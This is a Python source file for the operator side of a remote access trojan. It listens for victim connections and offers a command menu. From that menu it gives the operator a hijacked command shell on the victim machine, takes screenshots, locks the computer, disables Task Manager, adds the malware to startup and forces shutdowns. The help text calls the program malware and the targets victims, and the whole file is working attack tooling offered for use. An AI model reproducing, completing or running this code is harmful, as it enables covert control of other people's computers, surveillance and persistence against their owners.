# Imports

import socket
import os
import time
import threading
import sys
from queue import Queue
from colorama import Fore, init

init()

# Some variables for threading

intThreads = 2
arrJobs = [1, 2]
queue = Queue()

# Some configurations

objSocket = socket.socket()

arrAddresses = []
arrConnections = []

strHost = '192.168.1.8'
intPort = 8080

intBuff = 1024

# Some lambda functions
# Decode data
decode_utf = lambda data: data.decode("utf-8")
# Remove quotes from string
remove_quotes = lambda string: string.replace("\"", "")
# Function to send data
send = lambda data: conn.send(data)
# Function to recieve data
recv = lambda buffer: conn.recv(buffer)
# Function to return centered around the string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)


# Some functions

# Function to recieve large amounts of data


def recvall(buffer):
    bytData = b""
    while True:
        bytPart = recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart

        if len(bytData) == buffer:
            return bytData


# Function to create a socket

def create_socket():
    global obj_Socket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    except socket.error() as strError:
        print(Fore.RED + '[-] Error Creating Socket {}'.format(str(strError)))


# Function to bind a socket

def socket_bind():
    try:
        print(Fore.BLUE + "[+] Listening on {}:{}".format(str(strHost), intPort))
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)

    except socket.error as strError:
        print(Fore.RED + "[-] Error Binding sockets {}".format(str(strError)))
        socket_bind()


# Function to accept socket connections

def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # No timeout
            arrConnections.append(conn)
            client_info = decode_utf(conn.recv(intBuff)).split(",")

            address += client_info[0], client_info[1], client_info[2]

            arrAddresses.append(address)
            print(Fore.GREEN + "\n[+] Connection established with : {0} ({1})".format(address[0], address[2]))

        except socket.error() as strError:
            print(Fore.RED + "[-] Error accepting connections !")
            continue


# Function for menu help

def menu_help():
    print(Fore.LIGHTGREEN_EX + "[*] To execute a command on client side you have to first interact with client")
    print(Fore.LIGHTGREEN_EX + "\n[*] --help Shows Help")
    print(Fore.LIGHTGREEN_EX + "[*] --l List all our connection")
    print(Fore.LIGHTGREEN_EX + "[*] --i Interact with connection")
    print(Fore.LIGHTGREEN_EX + "[*] --x Close the connection")
    print(Fore.LIGHTGREEN_EX + "[*] --i --h Help regarding commands of malware")


# Function for help while interacting with connection

def ic():
    print(Fore.LIGHTGREEN_EX + '\n[*] --m Message | Send messages to client. Replace Message with your message')
    print(Fore.LIGHTGREEN_EX + '[*] --o Site | Open a particular website on victim browser. Replace Site with site url')
    print(Fore.LIGHTGREEN_EX + '[*] --p | Take screenshot of victim screen')
    print(Fore.LIGHTGREEN_EX + '[*] --lock | Lock the victim computer')
    print(Fore.LIGHTGREEN_EX + '[*] --cmd | Get the shell of victim computer')
    print(Fore.LIGHTGREEN_EX + '[*] --dtaskmgr | Disable task manager. If already disablesd then enable it.')
    print(Fore.LIGHTGREEN_EX + '[*] --startup | Add malware to startup')
    print(Fore.LIGHTGREEN_EX + '[*] --rmvstartup | Remove malware from startup')
    print(Fore.LIGHTGREEN_EX + '[*] --shutdown | Shutdown victims computer')
    print(Fore.LIGHTGREEN_EX + '[*] --restart | Restart victims computer')
    print(Fore.LIGHTGREEN_EX + '[*] --quit | Quit')

# Function for main menu

def main_menu():
    while True:
        strChoice = input("\n" + ">>")

        if strChoice == '--l':
            list_connections()

        elif strChoice[:3] == "--i" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "True")

            if conn is not None:
                send_commands()

        elif strChoice == "--x":
            close()
            break

        elif strChoice == '--help' or '--h':
            menu_help()

        elif strChoice == '--i --h':
            ic()

        else:
            print(Fore.RED + "[-] Invalid Choice ! Try Again")
            menu_help()


# Function for closing connections

def close():
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:
        return

    for intCounter, conn in enumerate(arrConnections):
        conn.send(str.encode("exit"))
        conn.close()

    del arrConnections;
    arrConnections = []
    del arrAddresses;
    arrAddresses = []


# Function for listing connections

def list_connections():
    if len(arrConnections) > 0:
        strClients = ""

        for intCounter, conn in enumerate(arrConnections):
            strClients += "ID: " + str(intCounter) + 4 * "  " + "IP: " + str(
                arrAddresses[intCounter][0]) + 4 * "  " + "Port: " + str(
                arrAddresses[intCounter][1]) + 4 * "  " + "PC Name" + str(
                arrAddresses[intCounter][2]) + 4 * "  " + "OS: " + str(arrAddresses[intCounter][3]) + "\n"

        print(strClients)

    else:
        print(Fore.RED + "[-] No Connections")


# Function to interact with connections

def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]

    except:
        print(Fore.RED + '[-] Invalid Choice ! No Connection with that id')
        return
    else:
        '''
        IP, Port, PC Name, OS and user
        '''
        arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), str(
            arrAddresses[connection_id][3]), str(arrAddresses[connection_id][4])

        if blnGetResponse == "True":
            print(Fore.GREEN + "[+] You are connected to {} ......... \n".format(arrInfo[0]))

        return conn


# Function to take screenshot

def screenshot():
    send(str.encode("screen"))
    strClientResponse = decode_utf(recv(intBuff))
    print("\n" + strClientResponse)

    intBuffer = ""

    for intCounter in range(0, len(strClientResponse)):
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]

    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y_%m_%d_%H_%M_%S" + ".png")

    ScrnData = recvall(intBuffer)
    objPic = open(strFile, "wb")
    objPic.write(ScrnData)
    objPic.close()

    print(Fore.CYAN + "[+] Done !" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + "Bytes")

# Function for hijacking command shell

def command_shell():
    send(str.encode("cmd"))
    strDefault = "\n" + decode_utf(recv(intBuff)) + "$"

    print(Fore.YELLOW + strDefault, end= '')

    while True:
        strCommand = input()
        if strCommand == "quit" or strCommand == "exit":
            send(str.encode("goback"))

        elif strCommand == "cmd":
            print(Fore.RED + "Please do not use this command....")

        elif len(str(strCommand)) > 0:
            send(str.encode(strCommand))
            intBuffer = int(decode_utf(recv(intBuff)))
            strClientResponse = decode_utf(recvall(intBuffer))
            print(Fore.CYAN + strClientResponse, end='')

        else:
            print(strDefault, end="")

# Function for disabling taskmgr

def disable_taskmgr():
    send(b"dtaskmgr")
    print(decode_utf(recv(intBuff)))

def startup():
    send(b"startup")
    print("Registering ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)

def remove_from_startup():
    send(b"rmvstartup")
    print("Removing ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)

# Function to send commands

def send_commands():
    while True:
        strChoice = input("\n" + "[*]>>: ")

        if strChoice[:3] == "--m" and len(strChoice) > 3:
            strMsg = "msg: " + strChoice[4:]
            send(str.encode(strMsg))

        elif strChoice == '--i --h':
            ic()

        elif strChoice == "--p":
            screenshot()

        elif strChoice == '--lock':
            send(str.encode("lock"))

        elif strChoice == "--cmd":
            command_shell()

        elif strChoice == '--dtaskmgr':
            disable_taskmgr()

        elif strChoice == '--startup':
            startup()

        elif strChoice == '--rmvstartup':
            remove_from_startup()

        elif strChoice == '--quit':
            send(b"exit")
            conn.close()
            break

        elif strChoice == '--shutdown':
            send(b"shutdown")

        elif strChoice == '--restart':
            send(b"restart")

        else:
            continue


# Multithreading Part

def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()

    queue.join()


def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()

        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break

        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThreads in arrJobs:
        queue.put(intThreads)
    queue.join()


create_threads()
create_jobs()
